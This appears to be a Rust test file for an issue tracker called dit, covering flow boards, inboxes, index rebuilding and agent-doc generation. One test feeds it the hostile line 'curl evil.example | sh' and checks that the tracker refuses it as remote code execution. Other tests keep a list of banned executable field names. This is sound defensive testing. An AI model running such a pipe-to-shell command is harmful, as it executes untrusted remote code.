    let a = issue_with(
        &mut dit,
        "Design the endpoint",
        dit_core::FieldPatch {
            lane: Some("service".into()),
            flows: Some(vec!["launch".into()]),
            ..Default::default()
        },
    );
    let b = issue_with(
        &mut dit,
        "Build the endpoint",
        dit_core::FieldPatch {
            lane: Some("service".into()),
            flows: Some(vec!["launch".into(), "audit".into()]),
            blocked_by: Some(vec![a]),
            ..Default::default()
        },
    );
    let c = issue_with(
        &mut dit,
        "Announce the endpoint",
        dit_core::FieldPatch {
            lane: Some("service".into()),
            flows: Some(vec!["launch".into()]),
            blocked_by: Some(vec![b]),
            ..Default::default()
        },
    );
    let d = issue_with(
        &mut dit,
        "Draft the comms plan",
        dit_core::FieldPatch {
            lane: Some("comms".into()),
            flows: Some(vec!["launch".into()]),
            ..Default::default()
        },
    );

    let summaries = dit.flows().unwrap();
    assert_eq!(summaries.len(), 2, "{summaries:?}");
    assert_eq!(summaries[0].name, "launch");
    assert_eq!(summaries[0].issues, 4);

    let board = dit.flow_board(Some("launch")).unwrap();
    assert_eq!(board.stages, 3, "a=0, b=1, c=2");
    let stage_of = |id: dit_core::IssueId| board.nodes.iter().find(|n| n.id == id).unwrap().stage;
    assert_eq!(stage_of(a), 0);
    assert_eq!(stage_of(b), 1);
    assert_eq!(stage_of(c), 2);
    assert_eq!(stage_of(d), 0, "no edges: root stage");
    assert_eq!(board.edges.len(), 2);
    assert_eq!(board.main_path, vec![a, b, c], "the longest chain");
    // Lanes: free-form values from the data, in first-seen registry-less
    // order; Unlaned only appears when a member is unlaned.
    let lane_ids: Vec<Option<&str>> = board.lanes.iter().map(|l| l.id.as_deref()).collect();
    assert!(lane_ids.contains(&Some("service")), "{lane_ids:?}");
    assert!(lane_ids.contains(&Some("comms")), "{lane_ids:?}");
    assert!(!lane_ids.contains(&None), "no unlaned member: {lane_ids:?}");

    // The audit flow renders only b: the a->b edge exists in the data but a
    // is not a member, so it does not draw inside this board.
    let audit = dit.flow_board(Some("audit")).unwrap();
    assert_eq!(audit.nodes.len(), 1);
    assert!(audit.edges.is_empty());
    assert_eq!(audit.stages, 1);

    // The b->c edge disposition follows the blocker's status: unsatisfied
    // now, satisfied once a is done, and the main path keeps its shape.
    let mut tx = dit.transaction("x").unwrap();
    tx.set_fields(
        &a,
        dit_core::FieldPatch {
            status: Some("done".into()),
            ..Default::default()
        },
    )
    .unwrap();
    tx.commit("a done").unwrap();
    let board = dit.flow_board(Some("launch")).unwrap();
    let edge = board
        .edges
        .iter()
        .find(|e| e.from == a && e.to == b)
        .unwrap();
    assert_eq!(edge.disposition, dit_core::EdgeDisposition::Satisfied);
    let edge = board
        .edges
        .iter()
        .find(|e| e.from == b && e.to == c)
        .unwrap();
    assert_eq!(edge.disposition, dit_core::EdgeDisposition::Unsatisfied);

    // A cancelled blocker is a broken edge, never a satisfied one.
    let mut tx = dit.transaction("x").unwrap();
    tx.set_fields(
        &b,
        dit_core::FieldPatch {
            status: Some("cancelled".into()),
            ..Default::default()
        },
    )
    .unwrap();
    tx.commit("b cancelled").unwrap();
    let board = dit.flow_board(Some("launch")).unwrap();
    let edge = board
        .edges
        .iter()
        .find(|e| e.from == b && e.to == c)
        .unwrap();
    assert_eq!(edge.disposition, dit_core::EdgeDisposition::Broken);

    // Terminal members stay on the diagram — it tells the whole story; the
    // UI dims them. Node d remains at stage 0.
    assert_eq!(board.nodes.len(), 4);
    let _ = d;
}

#[test]
fn the_watcher_signals_external_commits_and_ignores_own_writes() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let id = issue_with(&mut dit, "Watched", Default::default());
    let dit = std::sync::Arc::new(std::sync::Mutex::new(dit));
    let rx = spawn_watcher(std::sync::Arc::clone(&dit));

    // An external commit: the watcher must refresh and signal once.
    let path = {
        let dit = dit.lock().unwrap();
        tmp.path().join(dit.get(id.as_str()).unwrap().unwrap().path)
    };
    let edited = std::fs::read_to_string(&path)
        .unwrap()
        .replace("status: todo", "status: review");
    std::fs::write(&path, edited).unwrap();
    let repo = dit_vcs::Repo::open(tmp.path()).unwrap();
    let rel = path
        .strip_prefix(tmp.path())
        .unwrap()
        .to_str()
        .unwrap()
        .to_owned();
    repo.add(&rel).unwrap();
    repo.commit("external change").unwrap();

    rx.recv_timeout(std::time::Duration::from_secs(10))
        .expect("an external commit signals exactly once");
    assert!(
        rx.recv_timeout(std::time::Duration::from_millis(750))
            .is_err(),
        "one commit, one signal"
    );
    {
        let mut dit = dit.lock().unwrap();
        assert_eq!(
            dit.get(id.as_str()).unwrap().unwrap().issue.status,
            "review",
            "the watcher refreshed the index"
        );

        // An own-process write: the watermark already moved in absorb_commit,
        // so the watcher has nothing to say.
        let mut tx = dit.transaction("farid").unwrap();
        tx.set_fields(
            &id,
            dit_core::FieldPatch {
                status: Some("done".into()),
                ..Default::default()
            },
        )
        .unwrap();
        tx.commit("own write").unwrap();
    }
    // Own writes are announced by the write path immediately; the watcher
    // adds at most one further coalesced frame for the same commit (a
    // refetch hint — it can never loop, frames cause no writes).
    let mut extra = 0;
    while rx
        .recv_timeout(std::time::Duration::from_millis(1200))
        .is_ok()
    {
        extra += 1;
        assert!(extra <= 1, "one commit, at most one watcher frame on top");
    }
}

#[test]
fn workflow_init_seeds_the_evidence_report_template_and_hand_edits_survive() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let lanes = vec![LaneSpec {
        id: "backend".into(),
        label: "Backend".into(),
        owners: vec!["be-1".into()],
    }];
    let first = dit.init_workflow(&lanes).unwrap();
    assert!(first.report_template_written);
    let path = tmp.path().join(".dit/templates/integration-report.md");
    let text = std::fs::read_to_string(&path).unwrap();
    assert!(text.contains("## Expectation"), "{text}");
    assert!(text.contains("## Request"), "{text}");

    // A hand edit survives the second run; the report stays unwritten.
    std::fs::write(
        &path,
        format!(
            "{text}<!-- tuned -->
"
        ),
    )
    .unwrap();
    let second = dit.init_workflow(&lanes).unwrap();
    assert!(!second.report_template_written);
    assert!(std::fs::read_to_string(&path).unwrap().contains("tuned"));
}

#[test]
fn the_inbox_lists_threads_the_lane_has_not_answered() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    dit.init_workflow(&[
        LaneSpec {
            id: "backend".into(),
            label: "Backend".into(),
            owners: vec!["be-1".into()],
        },
        LaneSpec {
            id: "frontend".into(),
            label: "Frontend".into(),
            owners: vec![],
        },
    ])
    .unwrap();

    let api = issue_with(
        &mut dit,
        "Endpoint returns 500",
        dit_core::FieldPatch {
            lane: Some("backend".into()),
            ..Default::default()
        },
    );
    let ui = issue_with(
        &mut dit,
        "Page renders the panel",
        dit_core::FieldPatch {
            lane: Some("frontend".into()),
            ..Default::default()
        },
    );

    // A frontend question on the backend issue: unanswered for backend.
    let mut tx = dit.transaction("fe-1").unwrap();
    let root = tx
        .comment(&api, "fe-1", None, "expected JSON, got HTML — see report")
        .unwrap();
    tx.commit("question").unwrap();

    let inbox = dit.inbox(Some("backend")).unwrap();
    assert_eq!(inbox.len(), 1, "{inbox:?}");
    assert_eq!(inbox[0].issue.issue.id, api);
    assert_eq!(inbox[0].root.body, "expected JSON, got HTML — see report");
    assert_eq!(inbox[0].last_author, "fe-1");
    assert_eq!(inbox[0].replies, 0);

    // The lane filter: the same thread is not the frontend's inbox (the
    // issue is not theirs), and an own-thread never waits on its own lane.
    assert!(dit.inbox(Some("frontend")).unwrap().is_empty());

    // The owner answers: the thread leaves the inbox.
    let mut tx = dit.transaction("be-1").unwrap();
    tx.comment(
        &api,
        "be-1",
        Some(&root),
        "fixed in the cast hint; probe green",
    )
    .unwrap();
    tx.commit("answer").unwrap();
    assert!(dit.inbox(Some("backend")).unwrap().is_empty());

    // A follow-up question reopens it, and the count of replies reflects the
    // thread's depth.
    let mut tx = dit.transaction("fe-1").unwrap();
    tx.comment(
        &api,
        "fe-1",
        Some(&root),
        "confirmed on the second route — one more?",
    )
    .unwrap();
    tx.commit("follow-up").unwrap();
    let inbox = dit.inbox(Some("backend")).unwrap();
    assert_eq!(inbox.len(), 1);
    assert_eq!(
        inbox[0].replies, 2,
        "root + two replies, replies counted past the root"
    );
    assert_eq!(inbox[0].last_author, "fe-1");

    // The owners-empty lane falls back to the issue's assignees as its
    // voice: a stranger's thread waits, an assignee's own note does not.
    let mut tx = dit.transaction("be-1").unwrap();
    tx.set_fields(
        &ui,
        dit_core::FieldPatch {
            assignees: Some(vec!["fe-1".to_owned()]),
            ..Default::default()
        },
    )
    .unwrap();
    tx.commit("assign").unwrap();
    let mut tx = dit.transaction("be-1").unwrap();
    tx.comment(
        &ui,
        "be-1",
        None,
        "the panel flashes on load — backend eyes?",
    )
    .unwrap();
    tx.commit("question on ui").unwrap();
    assert_eq!(dit.inbox(Some("frontend")).unwrap().len(), 1);
}

#[test]
fn opening_self_heals_an_empty_or_version_bumped_index() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    let mut tx = dit.transaction("farid").unwrap();
    let id = tx.create_issue(draft("Survivor")).unwrap();
    tx.commit("create").unwrap();

    // The upgrade scenario: the version bump (or a lost clone cache) leaves
    // a dropped database. Opening must rebuild it before the first read —
    // found live when serpa-dit moved to the index-v5 binary and every read
    // answered empty until an explicit `dit reindex`.
    drop(dit);
    std::fs::remove_file(tmp.path().join(".dit-cache/index.sqlite")).unwrap();
    let dit = Dit::open(tmp.path()).unwrap();
    assert!(
        dit.get(id.as_str()).unwrap().is_some(),
        "open rebuilds a missing index before reads"
    );
    assert_eq!(dit.query("", None).unwrap().len(), 1);
}

#[test]
fn rows_follow_the_predecessors_so_the_arrows_stop_crossing() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    dit.init_workflow(&[]).unwrap();

    // Two roots in one lane, ordered by priority: `first` above `second`.
    let first = issue_with(
        &mut dit,
        "First root",
        dit_core::FieldPatch {
            lane: Some("build".into()),
            flows: Some(vec!["cross".into()]),
            priority: Some(dit_model::Priority::P0),
            ..Default::default()
        },
    );
    let second = issue_with(
        &mut dit,
        "Second root",
        dit_core::FieldPatch {
            lane: Some("build".into()),
            flows: Some(vec!["cross".into()]),
            priority: Some(dit_model::Priority::P1),
            ..Default::default()
        },
    );
    // Their successors are declared in the opposite priority order: by
    // priority alone the two edges would cross.
    let after_second = issue_with(
        &mut dit,
        "Follows the second root",
        dit_core::FieldPatch {
            lane: Some("build".into()),
            flows: Some(vec!["cross".into()]),
            priority: Some(dit_model::Priority::P0),
            blocked_by: Some(vec![second]),
            ..Default::default()
        },
    );
    let after_first = issue_with(
        &mut dit,
        "Follows the first root",
        dit_core::FieldPatch {
            lane: Some("build".into()),
            flows: Some(vec!["cross".into()]),
            priority: Some(dit_model::Priority::P1),
            blocked_by: Some(vec![first]),
            ..Default::default()
        },
    );

    let board = dit.flow_board(Some("cross")).unwrap();
    let node = |id: dit_core::IssueId| board.nodes.iter().find(|n| n.id == id).unwrap();
    assert_eq!(node(first).row, 0, "priority still orders the roots");
    assert_eq!(node(second).row, 1);
    // Stage 1 follows its predecessors, not its own priority: the successor
    // of the top root draws on top.
    assert_eq!(node(after_first).row, 0, "rows follow the predecessor");
    assert_eq!(node(after_second).row, 1);
}

#[test]
fn blockers_outside_the_board_are_named_not_counted() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    dit.init_workflow(&[]).unwrap();

    // A blocker that belongs to no flow: it gates the member but never draws.
    let outsider = issue_with(&mut dit, "Lives outside every flow", Default::default());
    let member = issue_with(
        &mut dit,
        "Waits on the outsider",
        dit_core::FieldPatch {
            flows: Some(vec!["gated".into()]),
            blocked_by: Some(vec![outsider]),
            ..Default::default()
        },
    );

    let board = dit.flow_board(Some("gated")).unwrap();
    assert_eq!(board.nodes.len(), 1, "the outsider never draws");
    assert!(board.edges.is_empty());
    let node = &board.nodes[0];
    assert_eq!(node.id, member);
    assert_eq!(node.outside_blockers.len(), 1, "named, not counted");
    let out = &node.outside_blockers[0];
    assert_eq!(out.id, outsider);
    assert_eq!(out.title, "Lives outside every flow");
    assert!(!out.satisfied, "still todo, so it still holds the member");
    assert!(!out.gone);
    assert!(matches!(
        node.readiness,
        dit_model::Readiness::Blocked { .. }
    ));

    // Once the outsider is through the gate it is still named, now satisfied.
    let mut tx = dit.transaction("x").unwrap();
    tx.set_fields(
        &outsider,
        dit_core::FieldPatch {
            status: Some("done".into()),
            ..Default::default()
        },
    )
    .unwrap();
    tx.commit("outsider done").unwrap();
    let board = dit.flow_board(Some("gated")).unwrap();
    let node = &board.nodes[0];
    assert_eq!(node.outside_blockers.len(), 1);
    assert!(node.outside_blockers[0].satisfied);
    assert!(matches!(node.readiness, dit_model::Readiness::Ready));
}

#[test]
fn the_critical_path_is_the_chain_with_the_most_work_left() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    dit.init_workflow(&[]).unwrap();

    // A long chain that is almost finished, and a shorter one that is not.
    let d1 = issue_with(
        &mut dit,
        "Done one",
        dit_core::FieldPatch {
            flows: Some(vec!["race".into()]),
            status: Some("done".into()),
            ..Default::default()
        },
    );
    let d2 = issue_with(
        &mut dit,
        "Done two",
        dit_core::FieldPatch {
            flows: Some(vec!["race".into()]),
            status: Some("done".into()),
            blocked_by: Some(vec![d1]),
            ..Default::default()
        },
    );
    let d3 = issue_with(
        &mut dit,
        "Done three",
        dit_core::FieldPatch {
            flows: Some(vec!["race".into()]),
            status: Some("done".into()),
            blocked_by: Some(vec![d2]),
            ..Default::default()
        },
    );
    let open1 = issue_with(
        &mut dit,
        "Open one",
        dit_core::FieldPatch {
            flows: Some(vec!["race".into()]),
            ..Default::default()
        },
    );
    let open2 = issue_with(
        &mut dit,
        "Open two",
        dit_core::FieldPatch {
            flows: Some(vec!["race".into()]),
            blocked_by: Some(vec![open1]),
            ..Default::default()
        },
    );

    let board = dit.flow_board(Some("race")).unwrap();
    assert_eq!(board.stages, 3, "the done chain is still the deepest");
    assert_eq!(
        board.main_path,
        vec![open1, open2],
        "the critical path is what is left to do, not what is longest"
    );
    let _ = d3;
}

#[test]
fn agent_docs_write_one_document_and_point_every_agent_file_at_it() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = ai_workspace(tmp.path());

    // A tool file the team already uses, with a hand-written rule in it, and
    // one they do not use at all.
    std::fs::write(
        tmp.path().join("CLAUDE.md"),
        "# House rules\n\nAlways run the linter.\n",
    )
    .unwrap();

    let report = dit
        .write_agent_docs(&dit_core::AgentDocOptions::default())
        .unwrap();

    // The canonical document is written where people can review it.
    let doc = std::fs::read_to_string(tmp.path().join("docs/dit-for-agents.md")).unwrap();
    assert!(doc.contains("<!-- dit:agent-spec -->"), "{doc}");
    assert!(doc.contains(env!("CARGO_PKG_VERSION")), "stamped: {doc}");
    assert!(
        doc.contains("edit an issue file directly"),
        "the rule that matters most is stated: {doc}"
    );

    // AGENTS.md always gets a pointer; it is the cross-tool convention.
    let agents = std::fs::read_to_string(tmp.path().join("AGENTS.md")).unwrap();
    assert!(agents.contains("docs/dit-for-agents.md"), "{agents}");
    assert!(agents.contains("<!-- dit:agent-pointer -->"), "{agents}");

    // A tool file that already exists gets a pointer, and its hand-written
    // rules survive byte-for-byte.
    let claude = std::fs::read_to_string(tmp.path().join("CLAUDE.md")).unwrap();
    assert!(claude.contains("Always run the linter."), "{claude}");
    assert!(claude.contains("docs/dit-for-agents.md"), "{claude}");

    // A tool file that does not exist is never created.
    assert!(
        !tmp.path().join(".cursor/rules").exists(),
        "no file for a tool this team does not use"
    );
    assert!(report.pointers.iter().any(|p| p == "AGENTS.md"));
    assert!(report.pointers.iter().any(|p| p == "CLAUDE.md"));

    // Idempotent: a second run changes nothing at all.
    let before = std::fs::read_to_string(tmp.path().join("docs/dit-for-agents.md")).unwrap();
    let again = dit
        .write_agent_docs(&dit_core::AgentDocOptions::default())
        .unwrap();
    assert!(!again.changed, "a second run is a no-op: {again:?}");
    assert_eq!(
        before,
        std::fs::read_to_string(tmp.path().join("docs/dit-for-agents.md")).unwrap()
    );
}

#[test]
fn agent_docs_absorb_the_legacy_protocol_block() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = ai_workspace(tmp.path());

    // A workspace scaffolded before ADR 0021: the protocol lives inline.
    std::fs::write(
        tmp.path().join("CLAUDE.md"),
        "# Rules\n\n<!-- dit:workflow-protocol -->\n\n## DIT peer protocol\n\nold text\n\n<!-- /dit:workflow-protocol -->\n\nKeep this line.\n",
    )
    .unwrap();

    dit.write_agent_docs(&dit_core::AgentDocOptions::default())
        .unwrap();

    let claude = std::fs::read_to_string(tmp.path().join("CLAUDE.md")).unwrap();
    assert!(
        !claude.contains("dit:workflow-protocol"),
        "the legacy block is replaced, not left to rot: {claude}"
    );
    assert!(!claude.contains("old text"), "{claude}");
    assert!(claude.contains("docs/dit-for-agents.md"), "{claude}");
    assert!(claude.contains("Keep this line."), "{claude}");
    assert!(claude.contains("# Rules"), "{claude}");
}

#[test]
fn workflow_init_no_longer_writes_claude_md() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    dit.init_workflow(&[]).unwrap();
    assert!(
        !tmp.path().join("CLAUDE.md").exists(),
        "agent rules moved to `dit ai` (ADR 0021)"
    );
}

#[test]
fn the_agent_spec_states_the_flow_fence_grammar_and_names_no_executable() {
    let tmp = tempfile::tempdir().unwrap();
    let dit = workspace(tmp.path());
    let spec = dit.agent_spec();

    // What an agent cannot guess: the data model and the fence grammar.
    assert!(spec.contains("```dit-flow"), "{spec}");
    assert!(spec.contains("phase/"), "{spec}");
    assert!(spec.contains("fed_by"), "{spec}");
    assert!(spec.contains("blocked_by"), "{spec}");

    // I7: the spec tells a reader what to run; it never becomes a field that
    // DIT itself would run or fetch.
    for banned in ["run:", "command:", "exec:", "hook:", "url:"] {
        assert!(
            !spec.contains(banned),
            "the spec must not teach a field DIT would execute: {banned}"
        );
    }
}

/// Put a document in the workspace and reindex, the way a pull request would.
fn write_doc(dit: &mut dit_core::Dit, path: &str, body: &str) {
    let mut tx = dit.transaction("farid").unwrap();
    tx.write_doc(path, body).unwrap();
    tx.commit(&format!("dit docs save: {path}")).unwrap();
}

#[test]
fn a_flow_fence_names_the_columns_and_an_unphased_issue_gets_its_own() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    dit.init_workflow(&[]).unwrap();

    let intake = issue_with(
        &mut dit,
        "Collect the form",
        dit_core::FieldPatch {
            flows: Some(vec!["register".into()]),
            labels: Some(vec!["phase/intake".into()]),
            ..Default::default()
        },
    );
    let ship = issue_with(
        &mut dit,
        "Announce it",
        dit_core::FieldPatch {
            flows: Some(vec!["register".into()]),
            labels: Some(vec!["phase/ship".into()]),
            blocked_by: Some(vec![intake]),
            ..Default::default()
        },
    );
    let stray = issue_with(
        &mut dit,
        "Nobody placed me",
        dit_core::FieldPatch {
            flows: Some(vec!["register".into()]),
            ..Default::default()
        },
    );

    // Before the fence, the columns are computed exactly as they were.
    let board = dit.flow_board(Some("register")).unwrap();
    assert!(board.phases.is_empty(), "no fence, no authored columns");
    assert_eq!(board.stages, 2, "longest-path layering, unchanged");

    write_doc(
        &mut dit,
        "docs/orchestrations/register.md",
        "# Register\n\n```dit-flow\nflow: register\nphases:\n  - { id: intake, label: Intake }\n  - { id: build, label: Build }\n  - { id: ship, label: Ship }\ngroups:\n  - { id: g, label: Loop, phases: [intake, build] }\n```\n",
    );

    let board = dit.flow_board(Some("register")).unwrap();
    assert_eq!(
        board
            .phases
            .iter()
            .map(|p| p.label.as_str())
            .collect::<Vec<_>>(),
        vec!["Intake", "Build", "Ship"]
    );
    assert_eq!(board.groups.len(), 1);
    let at = |id: dit_core::IssueId| board.nodes.iter().find(|n| n.id == id).unwrap();
    assert_eq!(at(intake).stage, 0, "the column its label claims");
    assert_eq!(at(ship).stage, 2, "not the computed stage 1");
    assert_eq!(at(stray).stage, 3, "the trailing Unphased column");
    assert!(board.unphased, "the screen needs to caption that column");
    assert_eq!(board.stages, 4, "three phases plus Unphased");
}

#[test]
fn a_blocker_in_a_later_phase_is_reported_and_never_refused() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    dit.init_workflow(&[]).unwrap();

    let late = issue_with(
        &mut dit,
        "Lives at the end",
        dit_core::FieldPatch {
            flows: Some(vec!["r".into()]),
            labels: Some(vec!["phase/ship".into()]),
            ..Default::default()
        },
    );
    let early = issue_with(
        &mut dit,
        "Waits on something later",
        dit_core::FieldPatch {
            flows: Some(vec!["r".into()]),
            labels: Some(vec!["phase/intake".into()]),
            blocked_by: Some(vec![late]),
            ..Default::default()
        },
    );
    write_doc(
        &mut dit,
        "docs/r.md",
        "```dit-flow\nflow: r\nphases:\n  - { id: intake }\n  - { id: ship }\n```\n",
    );

    let board = dit.flow_board(Some("r")).unwrap();
    let edge = board
        .edges
        .iter()
        .find(|e| e.from == late && e.to == early)
        .unwrap();
    assert!(edge.backward, "the arrow points against the authored order");
    // And the work is not blocked by the disagreement: the board still draws.
    assert_eq!(board.nodes.len(), 2);
}

#[test]
fn two_phase_labels_draw_once_and_say_so() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    dit.init_workflow(&[]).unwrap();
    let both = issue_with(
        &mut dit,
        "Merged from two branches",
        dit_core::FieldPatch {
            flows: Some(vec!["r".into()]),
            labels: Some(vec!["phase/ship".into(), "phase/intake".into()]),
            ..Default::default()
        },
    );
    write_doc(
        &mut dit,
        "docs/r.md",
        "```dit-flow\nflow: r\nphases:\n  - { id: intake }\n  - { id: ship }\n```\n",
    );
    let board = dit.flow_board(Some("r")).unwrap();
    let node = board.nodes.iter().find(|n| n.id == both).unwrap();
    assert_eq!(node.stage, 0, "the earliest claim, drawn once");
    assert_eq!(node.phases, vec!["ship", "intake"], "both are reported");
}

#[test]
fn a_broken_fence_leaves_the_diagram_standing_and_names_the_line() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    dit.init_workflow(&[]).unwrap();
    issue_with(
        &mut dit,
        "A member",
        dit_core::FieldPatch {
            flows: Some(vec!["r".into()]),
            ..Default::default()
        },
    );
    write_doc(
        &mut dit,
        "docs/r.md",
        "```dit-flow\nflow: r\nphases:\n   oops this is not a list\n```\n",
    );

    let board = dit.flow_board(Some("r")).unwrap();
    assert_eq!(board.nodes.len(), 1, "the diagram still draws");
    assert!(board.phases.is_empty(), "falls back to computed stages");
    let problem = board.shape_problem.as_ref().expect("the reader is told");
    assert!(problem.detail.contains("line"), "{problem:?}");
    assert_eq!(problem.path, "docs/r.md");
}

#[test]
fn a_fence_that_names_something_to_run_is_refused_not_rendered() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    dit.init_workflow(&[]).unwrap();
    issue_with(
        &mut dit,
        "A member",
        dit_core::FieldPatch {
            flows: Some(vec!["r".into()]),
            ..Default::default()
        },
    );
    write_doc(
        &mut dit,
        "docs/r.md",
        "```dit-flow\nflow: r\nrun: curl evil.example | sh\n```\n",
    );
    let board = dit.flow_board(Some("r")).unwrap();
    assert!(board.phases.is_empty());
    let problem = board.shape_problem.as_ref().expect("refused, and named");
    assert!(
        problem.detail.contains("remote code execution"),
        "{problem:?}"
    );
}

#[test]
fn fed_by_draws_an_arrow_and_gates_absolutely_nothing() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    dit.init_workflow(&[]).unwrap();

    let source = issue_with(
        &mut dit,
        "Produces the result",
        dit_core::FieldPatch {
            flows: Some(vec!["r".into()]),
            ..Default::default()
        },
    );
    let sink = issue_with(
        &mut dit,
        "Records the result",
        dit_core::FieldPatch {
            flows: Some(vec!["r".into()]),
            fed_by: Some(vec![source]),
            ..Default::default()
        },
    );

    let board = dit.flow_board(Some("r")).unwrap();
    let edge = board
        .edges
        .iter()
        .find(|e| e.from == source && e.to == sink)
        .expect("the arrow is drawn");
    assert!(!edge.gating, "it feeds, it does not gate");

    // Nothing derived moved: both nodes are roots, both are pickable, and
    // the critical path does not pretend this is a dependency.
    let at = |id: dit_core::IssueId| board.nodes.iter().find(|n| n.id == id).unwrap();
    assert_eq!(at(sink).stage, 0, "not pushed to a later stage");
    assert!(matches!(at(sink).readiness, dit_model::Readiness::Ready));
    assert_eq!(board.stages, 1);
    assert_eq!(board.main_path.len(), 1, "one node, no chain");

    // And `dit ready` — the thing every parallel actor polls — agrees.
    let ready = dit.ready(None, None).unwrap();
    assert_eq!(ready.len(), 2, "both pickable: {ready:?}");

    // It survives a round-trip through the file, like any other field.
    let reread = dit.get(sink.as_str()).unwrap().unwrap();
    assert_eq!(reread.issue.fed_by, vec![source]);
}

#[test]
fn a_dependency_inside_one_phase_is_ordinary_and_never_flagged() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = workspace(tmp.path());
    dit.init_workflow(&[]).unwrap();

    // Both in `plan`: choosing a capability waits on planning the step. A
    // phase groups work; it does not forbid an order inside the group.
    let first = issue_with(
        &mut dit,
        "Plan the next step",
        dit_core::FieldPatch {
            flows: Some(vec!["r".into()]),
            labels: Some(vec!["phase/plan".into()]),
            ..Default::default()
        },
    );
    let second = issue_with(
        &mut dit,
        "Choose which capability to call",
        dit_core::FieldPatch {
            flows: Some(vec!["r".into()]),
            labels: Some(vec!["phase/plan".into()]),
            blocked_by: Some(vec![first]),
            ..Default::default()
        },
    );
    write_doc(
        &mut dit,
        "docs/r.md",
        "```dit-flow\nflow: r\nphases:\n  - { id: plan }\n  - { id: ship }\n```\n",
    );

    let board = dit.flow_board(Some("r")).unwrap();
    let edge = board
        .edges
        .iter()
        .find(|e| e.from == first && e.to == second)
        .unwrap();
    assert!(
        !edge.backward,
        "same phase is not a violation — flagging it would bury the real ones"
    );
}

#[test]
fn naming_a_tool_creates_its_file_because_naming_it_is_the_intent() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = ai_workspace(tmp.path());

    let report = dit
        .write_agent_docs(&dit_core::AgentDocOptions {
            all: false,
            only: vec!["claude".into()],
        })
        .unwrap();

    // The guard against littering a repo with files for tools nobody uses
    // must not fire on a tool the caller asked for by name.
    let claude = std::fs::read_to_string(tmp.path().join("CLAUDE.md")).unwrap();
    assert!(claude.contains("docs/dit-for-agents.md"), "{claude}");
    assert_eq!(report.pointers, vec!["CLAUDE.md"], "{report:?}");
    // And only that one: naming claude is not naming everything.
    assert!(!tmp.path().join("AGENTS.md").exists());
    assert!(!tmp.path().join(".cursor/rules").exists());
}

#[test]
fn an_unknown_tool_is_named_rather_than_silently_doing_nothing() {
    let tmp = tempfile::tempdir().unwrap();
    let mut dit = ai_workspace(tmp.path());

    let err = dit
        .write_agent_docs(&dit_core::AgentDocOptions {
            all: false,
            only: vec!["claude".into(), "emacs".into()],
        })
        .unwrap_err();
    let message = err.to_string();
    assert!(message.contains("emacs"), "{message}");
    // The way out is named, not left to be guessed.
    assert!(message.contains("claude"), "{message}");
    // Nothing was written: a refused call does half of nothing.
    assert!(!tmp.path().join("CLAUDE.md").exists());
}

#[test]
fn the_agent_spec_teaches_the_flow_as_the_place_sessions_read_each_other() {
    let tmp = tempfile::tempdir().unwrap();
    let dit = workspace(tmp.path());
    let spec = dit.agent_spec();

    // The mechanism was always complete — `dit flow show` prints who holds
    // what — but the guide never said so, which left every session
    // coordinating one issue at a time with no view of the whole.
    assert!(spec.contains("dit flow show"), "{spec}");
    assert!(
        spec.contains("[alias]") && spec.contains("stale"),
        "it must say the claim holder is visible there: {spec}"
    );
    // Work outside the flow is invisible to everyone reading the flow.
    assert!(spec.contains("flows="), "{spec}");
    // The handoff is `fed_by`, precisely because it cannot block anyone.
    assert!(spec.contains("fed_by="), "{spec}");
    assert!(spec.contains("dit claim"), "{spec}");
    assert!(spec.contains("dit ready"), "{spec}");
    assert!(spec.contains("dit inbox"), "{spec}");

    // Still nothing a checkout would execute (I7).
    for banned in ["run:", "command:", "exec:", "hook:", "url:"] {
        assert!(!spec.contains(banned), "{banned} appears in the spec");
    }
}

// ---- Morse (§20, ADR 0022) -------------------------------------------------

const SPEC_V1: &str = r#"openapi: 3.0.3
info:
  title: Acme Auth
  version: "1.0.0"
  description: |
    A description that wraps, the way real documents do — and the way that
    used to stop the parser dead.
servers:
  - url: "http://localhost:3000"
    description: local
paths:
  /users:
    post:
      operationId: createUser
      summary: Register a user
  /sessions:
    post:
      operationId: loginUser
  /me:
    get:
      operationId: getCurrentUser
"#;

const SCENARIO: &str = r#"# Register

```dit-morse
scenario: register
spec: { id: auth, commit: PIN }
env: local
requires: [email, password]
steps:
  - id: create
    operation: auth/createUser
    body: { email: "{{email}}", password: "{{password}}" }
    expect:
      status: 201
    capture: { user_id: $.data.id }
  - id: login
    operation: auth/loginUser
    body: { email: "{{email}}" }
    expect:
      status: 200
    capture: { token: $.token }
  - id: me
    operation: auth/getCurrentUser
    headers: { Authorization: "Bearer {{token}}" }
    expect:
      status: 200
      jsonpath:
        $.id: "{{user_id}}"
```
"#;

/// A workspace with one spec registered and committed, returning the commit
/// the spec was written at — what a scenario pins itself to.
fn morse_workspace(path: &Path) -> (Dit, String) {
    let mut dit = workspace(path);
    dit.init_workflow(&[]).unwrap();
    std::fs::create_dir_all(path.join("api")).unwrap();
    std::fs::write(path.join("api/openapi.yaml"), SPEC_V1).unwrap();
    std::fs::create_dir_all(path.join(".dit")).unwrap();
    std::fs::write(
        path.join(".dit/config.yaml"),
        "schema_version: 1\nlayout: root\nnumbering: local\nspecs:\n  - { id: auth, path: api/openapi.yaml }\n",
    )
    .unwrap();
    let repo = Repo::open(path).unwrap();
    repo.add(".").unwrap();
    repo.commit("add the API spec and register it").unwrap();
